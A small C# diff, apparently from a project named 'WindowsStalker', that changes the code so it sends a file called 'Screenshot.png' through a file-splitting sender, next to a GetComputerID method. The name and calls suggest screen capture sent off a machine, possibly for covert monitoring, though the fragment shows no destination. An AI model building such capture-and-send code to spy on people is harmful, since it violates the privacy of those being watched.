@@ -49,9 +49,8 @@ namespace WindowsStalker
 //            sender.SendFrame(sampleMessage);
 
             Serializer s = new Serializer();
-            var toSent = s.SplitFile();
+            var toSent = s.SendFile("Screenshot.png", 1);
             s.SendSplitedFile(toSent);
-
         }
 
         public static string GetComputerID()
